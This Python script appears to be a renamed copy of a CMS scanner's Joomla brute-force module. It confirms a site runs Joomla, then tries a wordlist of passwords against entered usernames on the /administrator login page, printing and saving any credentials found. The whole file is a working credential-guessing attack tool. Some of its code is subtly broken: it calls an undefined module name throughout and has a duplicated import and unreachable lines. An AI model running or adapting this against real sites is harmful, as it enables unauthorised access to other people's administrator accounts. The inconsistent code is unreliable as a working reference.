#!/usr/bin/python3
# -*- coding: utf-8 -*-
# This is a part of CMSeeK, check the LICENSE file for more information
# Rex4 - Cantix Crew

import ciemesdb.basic as cmseek
import ciemesdb.sc as source # Contains function to detect cms from source code
import ciemesdb.header as header # Contains function to detect CMS from gathered http headers
import ciemesdb.generator as generator
import multiprocessing ## Let's speed things up a lil bit (actually a hell lot faster) shell we?
from functools import partial ## needed somewhere :/
import sys
import ciemesdb.generator as generator
import re
import urllib.request, urllib.error, urllib.parse
import http.cookiejar
from html.parser import HTMLParser

class extInpTags(HTMLParser):

    def __init__(self):
        HTMLParser.__init__(self)
        self.return_array = {}

    def handle_starttag(self, tag, attrs):
        if tag == "input":
            name  = None
            value = None
            for nm,val in attrs:
                if nm == "name":
                    name = val
                if nm == "value":
                    value = val
            if name is not None and value is not None:
                self.return_array.update({name:value})


def testlogin(url,user,passw):
    url = url + '/administrator/index.php'
    cj = http.cookiejar.FileCookieJar("cookieszz")
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    joomloginsrc = opener.open(url).read().decode()
    parser = extInpTags()
    post_array = parser.feed(joomloginsrc)
    main_param = {'username':user, 'passwd':passw}
    other_param = parser.return_array
    post_data = main_param.copy()
    post_data.update(other_param)
    post_datad = urllib.parse.urlencode(post_data).encode("utf-8")
    ua = ciemes.randomua('generatenewuaeverytimetobesafeiguess')
    try:
        with opener.open(url, post_datad) as response:
            scode = response.read().decode()
            headers = str(response.info())
            rurl = response.geturl()
            r = ['1', scode, headers, rurl] ## 'success code', 'source code', 'http headers', 'redirect url'
            return r
    except Exception as e:
        e = str(e)
        r = ['2', e, '', ''] ## 'error code', 'error message', 'empty'
        return r
    print('hola')


def start():
    ciemes.clearscreen()
    ciemes.banner("Joomla Bruteforce Module")
    url = ciemes.targetinp("") # input('Enter Url: ')
    ciemes.info("Checking for Joomla")
    bsrc = ciemes.getsource(url, ciemes.randomua('foodislove'))
    joomcnf = '0'
    if bsrc[0] != '1':
        ciemes.error("Could not get target source, CMSeek is quitting")
        ciemes.handle_quit()
    else:
        ## Parse generator meta tag
        parse_generator = generator.parse(bsrc[1])
        ga = parse_generator[0]
        ga_content = parse_generator[1]

        try1 = generator.scan(ga_content)
        if try1[0] == '1' and try1[1] == 'joom':
            joomcnf = '1'
        else:
            try2 = source.check(bsrc[1], url)
            if try2[0] == '1' and try2[1] == 'joom':
                joomcnf = '1'
            else:
                try3 = header.check(bsrc[2]) # Headers Check!
                if try3[0] == '1' and try3[1] == 'joom':
                    joomcnf = '1'
                else:
                    joomcnf = '0'
    if joomcnf != '1':
        ciemes.error('Could not confirm Joomla... CMSeek is quitting')
        ciemes.handle_quit()
    else:
        ciemes.success("Joomla Confirmed... Confirming form and getting token...")
        joomloginsrc = ciemes.getsource(url + '/administrator/index.php', ciemes.randomua('thatsprettygay'))
        if joomloginsrc[0] == '1' and '<form' in joomloginsrc[1]:
            # joomtoken = re.findall(r'type=\"hidden\" name=\"(.*?)\" value=\"1\"', joomloginsrc[1])
            # if len(joomtoken) == 0:
            #    ciemes.error('Unable to get token... CMSeek is quitting!')
            #    ciemes.handle_quit()
            # ciemes.success("Token grabbed successfully: " + ciemes.bold + joomtoken[0] + ciemes.cln)
            # token = joomtoken[0]
            joomparamuser = []
            rawuser = input("[~] Enter Usernames with coma as separation without any space (example: cris,harry): ").split(',')
            for rusr in rawuser:
                joomparamuser.append(rusr)
            joombruteusers = set(joomparamuser) ## Strip duplicate usernames in case any smartass didn't read the full thing and entered admin as well
            for user in joombruteusers:
                passfound = '0'
                print('\n')
                ciemes.info("Bruteforcing User: " + ciemes.bold + user + ciemes.cln)
                pwd_file = open("wordlist/passwords.txt", "r")
                passwords = pwd_file.read().split('\n')
                passwords.insert(0, user)
                for password in passwords:
                    if password != '' and password != '\n':
                        sys.stdout.write('[*] Testing Password: ')
                        sys.stdout.write('%s\r\r' % password)
                        sys.stdout.flush()
                        # print("Testing Pass: " + password)
                        cursrc = testlogin(url, user, password)
                        # print('Token: ' + token)
                        # print("Ret URL: " + str(cursrc[3]))
                        if 'logout' in str(cursrc[1]):
                            print('\n')
                            ciemes.success('Password found!')
                            print(" |\n |--[username]--> " + ciemes.bold + user + ciemes.cln + "\n |\n |--[password]--> " + ciemes.bold + password + ciemes.cln + "\n |")
                            ciemes.success('Enjoy The Hunt!')
                            ciemes.savebrute(url,url + '/administrator/index.php',user,password)
                            passfound = '1'
                            break
                        else:
                            continue
                        break
                if passfound == '0':
                        ciemes.error('\n\nPassword ga ketemu bre!')
                print('\n\n')

        else:
            cmseek.error("Login page ga ketemu..jadinya exit deh!")
            cmseek.handle_quit()
